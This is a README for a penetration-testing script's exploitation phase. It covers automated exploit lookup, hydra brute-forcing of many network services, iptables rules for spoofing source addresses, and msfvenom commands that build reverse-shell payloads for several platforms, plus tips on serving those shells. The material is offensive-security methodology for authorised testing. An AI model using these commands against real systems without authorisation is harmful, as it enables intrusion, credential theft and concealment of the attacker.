# Exploitation Phase

The goal of this phase is to penetrate the network. The findings from the Reconnaissance phase are used for this purpose. Techniques such as brute force or the exploitation of found vulnerabilities are used.

This environment variables controlled bash script serves as a tool for receiving some information that may be important for Exploitation Phase, including automatic exploit search or brute force passwords.

## Features

- Automatic Exploit Search: Search exploits from nmap vulnerability scan
- Brute Force most common services:
    - AFP, AJP, Cassandra, CouchDB, FTP, IMAP, IRC, ISCSI, LDAP, Mongo, MySQL, OracleSQL, POP, PostgreSQL, RDP, Redis, Rexec, Rlogin, Rsh, Rsync, RTSP, SNMP, SMB, SMTP, SOCKS, MS-SQL Server, SSH, Telnet, VNC

## Usage

1. Copy the `exploitation.conf.dist` file to `exploitation.conf`
```bash
cp exploitation.conf.dist exploitation.conf
```
2. Adjust the conf file to your needs
3. Run the script with following command:
```bash
./exploitation.sh -c exploitation.conf
```

## Results

Results stored to output/ directory.

## Search Exploits

Automatic approach:  

- Set SEARCHEXPLOIT variable to true to let the script find exploits from nmap vulners scan from reconnaissance phase

Manual approach:

- searchsploit (local copy of exploit-db)
- metasploit search (msf search)
- sqlmap

### searchsploit

Examples:  
```bash
searchsploit -u # update local exploit-db
searchsploit openssh -www
searchsploit apache 2.2 | grep -i local
```

If you have an EDB-ID, you can directly download an exploit with -m parameter:
```bash
searchsploit -m [EDB-ID]
# Example:
searchsploit -m 50689
```

### metasploit

Try metasploit (msfconsole) to search for an exploit by a given CVE Number or EDB-ID or by keywords.  
Metasploit search examples:
```bash
msfconsole -x "search cve:2010-2075; exit;" -q
msfconsole -x "search type:exploit platform:linux ftp; exit;" -q
msfconsole -x "search type:exploit platform:windows port:135; exit;" -q
```

## Tools used

All tools used are preinstalled on latest Kali Linux Version 2022.1:

- nmap
- hydra
- searchsploit

## Adress Spoofing

Use a working network interface or an IP address that exists in the network.  

Create the following iptables rules for to change the source address:

```sh
# only for icmp packages
sudo iptables -t nat -A POSTROUTING -p icmp -j SNAT --to-source <source ip>

# for all tcp/udp packages
sudo iptables -t nat -A POSTROUTING -j SNAT --to-source <source ip>
```

Check for more information: https://sandilands.info/sgordon/address-spoofing-with-iptables-in-linux

-----

## Additional Information

### Payloads

Creating payloads with MsfVenom:  

```sh
# msfvenom syntax
msfvenom -p [payload] LHOST=[listeninghost] LPORT=[listeningport] [more options]

# Examples:
# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > revshell.exe
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > revshell.exe    

# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > revshell.elf    
msfvenom -p linux/x64/shell_reverse_tcp RHOST=<IP> LPORT=<PORT> -f elf > revshell.elf

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > revshell.sh

# Python
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > revshell.py

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > revshell.php
```


### Reverse Shells

Checkout the following links on Reverse Shells:

- [Reverse Shell Generator](https://www.revshells.com/)
- [Reverse Shell Cheat Sheet @ HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [Different Shells @ HackTricks](https://book.hacktricks.xyz/shells/shells)

### Local Web Servers

Need an simple, local web server? These are great for serving up (reverse) shells  

| **Command**                             | **Description**                                                     |
|-----------------------------------------|---------------------------------------------------------------------|
| ```python2 -m SimpleHTTPServer 8000```   | Run a basic http server with python on port 8000 in this directory  |
| ```python3 -m http.server 8000```       | Same with python3                                                   |
| ```php -S 0.0.0.0:8000```               | Run a basic http server with php on port 8000 in this directory     | 

### SQL Injection

Try [sqlmap](https://github.com/sqlmapproject/sqlmap) to enumerate and inject sql databases.

### Command Injection

Checkout the [commix project](https://github.com/commixproject/commix/wiki/Usage-Examples) for possible command injection examples with commix or for [getting shells with commix](https://github.com/commixproject/commix/wiki/Getting-Shells).
